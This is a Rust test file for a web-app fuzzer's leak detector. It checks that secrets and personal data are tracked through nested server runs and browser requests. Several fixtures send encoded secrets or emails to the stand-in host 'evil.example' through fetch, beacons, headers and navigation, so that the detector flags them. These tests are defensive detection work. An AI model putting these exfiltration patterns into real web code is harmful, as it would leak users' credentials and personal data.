//! Sensitive values retain their origin through browser-triggered requests.
use appfuzz_core::{
    browser::{self, Session},
    detect::{self, Severity},
    envelope::Trace,
    labels,
    manifest::Manifest,
    payload,
    record::{HostCall, RunRecord},
};
use serde_json::{Value, json};
fn event(n: u32, func: &str, args: Value, result: Value) -> HostCall {
    serde_json::from_value(
        json!({"n":n,"func":func,"call":1,"args":args,"result":result,"source":"plan","granted":true,"latency_ns":0,"cost":0,"fuel_before":0,"t_ns":0}),
    )
    .unwrap()
}
fn run(id: &str, status: u32, body: &str) -> RunRecord {
    let mut r = Trace::default().to_record();
    r.id = id.into();
    r.spec.export = "handle".into();
    r.spec.args = vec![json!({"method":"GET","uri":"https://app.example/","headers":[],"body":""})];
    r.result = Some(json!({"status":status,"headers":[],"body":body}));
    r
}
fn fixture() -> (RunRecord, Session, Manifest) {
    let page = run("page", 200, "<script>fetch('/api')</script>");
    let session =
        Session { browser: run("visit", 200, ""), nested: vec![], report: json!({"url":"https://app.example/","errors":[]}), fragment: String::new() };
    let m=toml::from_str("[app]\nwasm='a.wasm'\n[entry]\nexport='handle'\noutput={status='status',headers='headers',body='body',body_format='html'}\n[functions.\"config#key\"]\nresult='secret'\n[functions.\"users#email\"]\nresult='pii'\n[functions.\"store#save\"]\nparams={auth='secret'}\n").unwrap();
    (page, session, m)
}
const SECRET: &str = "sk_private_backend_012345";
const EMAIL: &str = "person@mail.example";
#[test]
fn inherited_secrets_in_request_fields_still_fail_in_api_logs() {
    let (mut p, mut s, m) = fixture();
    p.events.push(event(1, "config#key", json!({}), json!(SECRET)));
    let mut api = run("api", 200, "ok");
    api.spec.args[0]["body"] = json!(SECRET);
    api.stdout = SECRET.into();
    s.nested.push(api);
    let f = browser::check(&p, &s, &m);
    assert!(f.iter().any(|f| f.kind == "secret_leak" && f.detail["nested_run"] == "api"), "{f:?}");
}
#[test]
fn inherited_pii_is_allowed_in_a_page_but_not_a_later_error_page() {
    let (p, mut s, m) = fixture();
    let mut first = run("first", 200, EMAIL);
    first.events.push(event(1, "users#email", json!({}), json!(EMAIL)));
    s.nested.push(first);
    assert!(browser::check(&p, &s, &m).iter().all(|f| f.kind != "pii_leak"));
    let mut error = run("error", 500, EMAIL);
    error.spec.args[0]["body"] = json!(EMAIL);
    s.nested.push(error);
    let f = browser::check(&p, &s, &m);
    assert!(f.iter().any(|f| f.kind == "pii_leak" && f.detail["nested_run"] == "error"), "{f:?}");
}
#[test]
fn inherited_values_obey_host_parameter_labels_and_output_policy() {
    let (mut p, mut s, m) = fixture();
    p.events.push(event(1, "config#key", json!({}), json!(SECRET)));
    let mut api = run("api", 200, "ok");
    api.events.push(event(1, "store#save", json!({"auth":SECRET}), Value::Null));
    s.nested.push(api);
    assert!(browser::check(&p, &s, &m).iter().all(|f| f.kind != "secret_leak"));
    s.nested[0].events[0].args.insert("other".into(), json!(SECRET));
    assert!(browser::check(&p, &s, &m).iter().any(|f| f.kind == "secret_leak"));
    s.nested[0].events.clear();
    s.nested[0].result.as_mut().unwrap()["body"] = json!(SECRET);
    assert!(browser::check(&p, &s, &m).iter().any(|f| f.kind == "secret_leak"));
}
#[test]
fn later_sources_do_not_taint_earlier_unrelated_server_logs() {
    let (p, mut s, m) = fixture();
    let mut first = run("first", 200, "ok");
    first.stdout = SECRET.into();
    s.nested.push(first);
    let mut later = run("later", 200, "ok");
    later.events.push(event(1, "config#key", json!({}), json!(SECRET)));
    s.nested.push(later);
    assert!(browser::check(&p, &s, &m).iter().all(|f| f.kind != "secret_leak"));
}
#[test]
fn host_values_already_judged_in_the_request_are_not_reported_twice() {
    let (mut p, mut s, m) = fixture();
    p.events.push(event(1, "config#key", json!({}), json!(SECRET)));
    let mut api = run("api", 200, "ok");
    api.events.push(event(1, "config#key", json!({}), json!(SECRET)));
    api.stdout = SECRET.into();
    s.nested.push(api);
    let mut f = browser::check(&p, &s, &m);
    f.extend(detect::per_run(&s.nested[0], &m));
    assert_eq!(f.iter().filter(|f| f.kind == "secret_leak").count(), 1, "{f:?}");
}
#[test]
fn a_secret_label_is_not_erased_by_an_earlier_pii_label_on_the_same_value() {
    let (mut p, s, m) = fixture();
    p.events = vec![event(1, "users#email", json!({}), json!(SECRET)), event(2, "config#key", json!({}), json!(SECRET))];
    p.result.as_mut().unwrap()["body"] = json!(SECRET);
    let f = labels::check(&p, &m);
    assert!(f.iter().any(|f| f.kind == "secret_leak"), "{f:?}");
    let mut s = s;
    s.nested.push(run("api", 200, SECRET));
    assert!(browser::check(&p, &s, &m).iter().any(|f| f.kind == "secret_leak"));
}

#[test]
fn conditional_labels_on_one_function_keep_the_secret_classification() {
    let (mut p, _, mut m) = fixture();
    m.functions.insert("profiles#read".into(), serde_json::from_value(json!({"result":"pii","rules":[{"when":{"private":true},"result":"secret"}]})).unwrap());
    p.events = vec![event(1, "profiles#read", json!({"private":false}), json!(SECRET)), event(2, "profiles#read", json!({"private":true}), json!(SECRET))];
    p.result.as_mut().unwrap()["body"] = json!(SECRET);
    assert!(labels::check(&p, &m).iter().any(|f| f.kind == "secret_leak"));
    p.result.as_mut().unwrap()["body"] = json!(hex(SECRET));
    let f = payload::check(&p, &m);
    let secret = f.iter().find(|f| f.detail["label"] == "secret").unwrap();
    assert_eq!(secret.severity, Severity::Fail);
    assert!(f.iter().filter(|f| f.id == secret.id).all(|f| f.severity == Severity::Fail), "{f:?}");
    // Archived cases use this source/place identity. Refining its label
    // must not make regression replay mistake the same leak for a fix.
    assert_eq!(secret.id, "f4a3de7ef2287523b1e5a4f215486b038");
}

fn hex(value: &str) -> String {
    value.bytes().map(|b| format!("{b:02x}")).collect()
}

#[test]
fn encoded_secrets_keep_the_stronger_label_after_a_pii_source() {
    let (mut p, _, m) = fixture();
    p.events = vec![event(1, "users#email", json!({}), json!(SECRET)), event(2, "config#key", json!({}), json!(SECRET))];
    p.result.as_mut().unwrap()["body"] = json!(hex(SECRET));
    let f = payload::check(&p, &m);
    assert!(f.iter().any(|f| f.kind == "encoded_flow" && f.severity == Severity::Fail && f.detail["label"] == "secret"), "{f:?}");
}

#[test]
fn inherited_encoded_secrets_are_checked_in_server_logs() {
    let (mut p, mut s, m) = fixture();
    p.events.push(event(1, "config#key", json!({}), json!(SECRET)));
    let mut api = run("api", 200, "ok");
    api.spec.args[0]["body"] = json!(SECRET);
    api.stdout = hex(SECRET);
    s.nested.push(api);
    let f = browser::check(&p, &s, &m);
    assert!(
        f.iter().any(|f| f.kind == "encoded_flow" && f.severity == Severity::Fail && f.detail["nested_run"] == "api" && f.detail["source_run"] == "page"),
        "{f:?}"
    );
}

#[test]
fn inherited_encoded_values_respect_parameter_and_response_policies() {
    let (mut p, mut s, m) = fixture();
    p.events.push(event(1, "config#key", json!({}), json!(SECRET)));
    let mut api = run("api", 200, "ok");
    api.events.push(event(1, "store#save", json!({"auth":hex(SECRET)}), Value::Null));
    s.nested.push(api);
    assert!(browser::check(&p, &s, &m).iter().all(|f| f.kind != "encoded_flow"));
    s.nested[0].events[0].args.insert("other".into(), json!(hex(SECRET)));
    assert!(browser::check(&p, &s, &m).iter().any(|f| f.kind == "encoded_flow"));
    s.nested[0].events.clear();
    s.nested[0].result.as_mut().unwrap()["body"] = json!(hex(SECRET));
    assert!(browser::check(&p, &s, &m).iter().any(|f| f.kind == "encoded_flow" && f.severity == Severity::Fail));
}

#[test]
fn locally_encoded_leaks_are_not_reported_twice_and_future_sources_do_not_taint_earlier_logs() {
    let (mut p, mut s, m) = fixture();
    let mut early = run("early", 200, "ok");
    early.stdout = hex(SECRET);
    s.nested.push(early);
    let mut later = run("later", 200, "ok");
    later.events.push(event(1, "config#key", json!({}), json!(SECRET)));
    later.stdout = hex(SECRET);
    s.nested.push(later);
    assert!(browser::check(&p, &s, &m).iter().all(|f| f.kind != "encoded_flow"));
    p.events.push(event(1, "config#key", json!({}), json!(SECRET)));
    s.nested.remove(0);
    let mut f = browser::check(&p, &s, &m);
    f.extend(detect::per_run(&s.nested[0], &m));
    assert_eq!(f.iter().filter(|f| f.kind == "encoded_flow").count(), 1, "{f:?}");
}

#[test]
fn a_local_pii_warning_cannot_hide_a_stronger_inherited_encoded_secret() {
    let (mut p, mut s, mut m) = fixture();
    m.functions.insert("profiles#read".into(), serde_json::from_value(json!({"result":"pii","rules":[{"when":{"private":true},"result":"secret"}]})).unwrap());
    p.events.push(event(1, "profiles#read", json!({"private":true}), json!(SECRET)));
    let mut api = run("api", 200, &hex(SECRET));
    api.events.push(event(1, "profiles#read", json!({"private":false}), json!(SECRET)));
    s.nested.push(api);
    assert!(payload::check(&s.nested[0], &m).iter().any(|f| f.kind == "encoded_flow" && f.severity == Severity::Warn));
    let f = browser::check(&p, &s, &m);
    assert!(f.iter().any(|f| f.kind == "encoded_flow" && f.severity == Severity::Fail && f.detail["label"] == "secret"), "{f:?}");
}

#[test]
fn browser_requests_and_navigation_detect_encoded_host_values() {
    let (mut p, mut s, m) = fixture();
    p.events.push(event(1, "config#key", json!({}), json!(SECRET)));
    let mut api = run("api", 200, EMAIL);
    api.events.push(event(1, "users#email", json!({}), json!(EMAIL)));
    s.nested.push(api);
    for (value, label) in [(SECRET, "secret"), (EMAIL, "pii")] {
        for encoding in ["base64", "hex", "reversed", "percent-escaped"] {
            let encoded = payload::encodings(value, true).into_iter().find(|(e, _)| *e == encoding).unwrap().1;
            for (func, args) in [
                (browser::FETCH_OTHER, json!({"url":format!("https://evil.example/?v={encoded}"),"method":"GET","kind":"fetch","headers":[],"body":""})),
                (browser::FETCH_OTHER, json!({"url":"https://evil.example/","method":"POST","kind":"beacon","headers":[],"body":encoded})),
                (browser::FETCH_OTHER, json!({"url":"https://evil.example/","method":"POST","kind":"fetch","headers":[["x-value",encoded]],"body":""})),
                (browser::GO, json!({"url":format!("https://evil.example/?v={encoded}"),"how":"location.assign","gesture":true})),
            ] {
                s.browser.events = vec![
                    event(1, browser::FETCH_OWN, json!({"path":"/api"}), json!({"ok":{"status":200,"headers":[],"body":EMAIL}})),
                    event(2, func, args, Value::Null),
                ];
                let f = browser::check(&p, &s, &m);
                assert!(
                    f.iter().any(|f| f.kind == "encoded_flow" && f.severity == Severity::Fail && f.detail["label"] == label && f.detail["value"] == value),
                    "{encoding}, {func}: {f:?}"
                );
            }
        }
    }
}

#[test]
fn ordinary_browser_requests_and_returning_data_to_the_same_origin_are_not_encoded_leaks() {
    let (mut p, mut s, m) = fixture();
    p.events.push(event(1, "config#key", json!({}), json!(SECRET)));
    s.browser.events = vec![event(1, browser::FETCH_OTHER, json!({"url":"https://evil.example/","body":"a public message"}), Value::Null)];
    assert!(browser::check(&p, &s, &m).iter().all(|f| f.kind != "encoded_flow"));
    s.browser.events = vec![event(1, browser::FETCH_OWN, json!({"path":"/api","body":hex(SECRET)}), Value::Null)];
    assert!(browser::check(&p, &s, &m).iter().all(|f| f.kind != "encoded_flow"));
    s.browser.events = vec![event(1, browser::GO, json!({"url":format!("https://app.example/?v={}",hex(SECRET)),"gesture":true}), Value::Null)];
    assert!(browser::check(&p, &s, &m).iter().all(|f| f.kind != "encoded_flow"));
}

#[test]
fn browser_egress_is_only_tainted_after_the_source_api_returned() {
    let (p, mut s, m) = fixture();
    let mut api = run("api", 200, EMAIL);
    api.events.push(event(1, "users#email", json!({}), json!(EMAIL)));
    s.nested.push(api);
    for value in [EMAIL.to_string(), hex(EMAIL)] {
        let outbound = json!({"url":"https://evil.example/","method":"POST","kind":"beacon","headers":[],"body":value});
        s.browser.events = vec![
            event(1, browser::FETCH_OTHER, outbound.clone(), Value::Null),
            event(2, browser::FETCH_OWN, json!({"path":"/api"}), json!({"ok":{"status":200,"body":EMAIL,"headers":[]}})),
            event(3, browser::FETCH_OTHER, outbound, Value::Null),
        ];
        let f = browser::check(&p, &s, &m);
        let leaks: Vec<_> = f.iter().filter(|f| matches!(f.kind.as_str(), "encoded_flow" | "pii_leak") && f.detail["value"] == EMAIL).collect();
        assert_eq!(leaks.len(), 1, "{f:?}");
        assert_eq!(leaks[0].detail["n"], 3, "the earlier request cannot come from a later source: {f:?}");
    }
}

#[test]
fn encoded_pii_in_error_pages_is_a_failure_while_normal_pages_keep_the_existing_warning_policy() {
    let (mut p, mut s, mut m) = fixture();
    p.events.push(event(1, "users#email", json!({}), json!(EMAIL)));
    for (status, severity) in [(200, Severity::Warn), (400, Severity::Fail), (500, Severity::Fail)] {
        s.nested = vec![run("api", status, &hex(EMAIL))];
        let f = browser::check(&p, &s, &m);
        assert!(f.iter().any(|f| f.kind == "encoded_flow" && f.detail["label"] == "pii" && f.severity == severity), "{status}: {f:?}");
        let mut local = s.nested[0].clone();
        local.events = p.events.clone();
        assert!(payload::check(&local, &m).iter().any(|f| f.kind == "encoded_flow" && f.severity == severity));
    }
    m.entry.as_mut().unwrap().no_pii = true;
    s.nested = vec![run("api", 200, &hex(EMAIL))];
    assert!(browser::check(&p, &s, &m).iter().any(|f| f.kind == "encoded_flow" && f.severity == Severity::Fail));
}

#[test]
fn native_browser_post_bodies_reach_the_app_for_fetch_xhr_and_beacons() {
    let (mut p, _, m) = fixture();
    p.spec.now = "2026-11-02T10:00:00".into();
    p.result.as_mut().unwrap()["body"] = json!(
        r#"<!doctype html><script>
        const body='name=A%26B+%C3%A9&x=1';
        fetch('/fetch',{method:'POST',headers:{'content-type':'application/x-www-form-urlencoded'},body});
        const x=new XMLHttpRequest();x.open('POST','/xhr');x.setRequestHeader('content-type','application/x-www-form-urlencoded');x.send(body);
        navigator.sendBeacon('/beacon',body);
        fetch('/get');
    </script>"#
    );
    let app = appfuzz_core::harness::App::from_bytes(m, wat::parse_str("(component)").unwrap()).unwrap();
    let browser = browser::Browser::shared().unwrap();
    for base in
        [json!({"method":"GET","uri":"https://app.example/","headers":[],"body":""}), json!({"method":"GET","path":"/","query":[],"form":[],"headers":[]})]
    {
        p.spec.args = vec![base.clone()];
        let s = browser
            .session(&app, &p, &|spec| {
                let mut r = run("api", 200, "ok");
                r.spec = spec.clone();
                r
            })
            .unwrap();
        s.ensure_executed().unwrap();
        assert_eq!(s.nested.len(), 4, "{:?}", s.browser.outcome);
        for r in &s.nested {
            let req = &r.spec.args[0];
            let post = req["method"] == "POST";
            if base.get("uri").is_some() {
                assert_eq!(req["body"], if post { "name=A%26B+%C3%A9&x=1" } else { "" }, "{req}");
            } else {
                assert_eq!(req["form"], if post { json!([["name", "A&B é"], ["x", "1"]]) } else { json!([]) }, "{req}");
            }
        }
    }
}
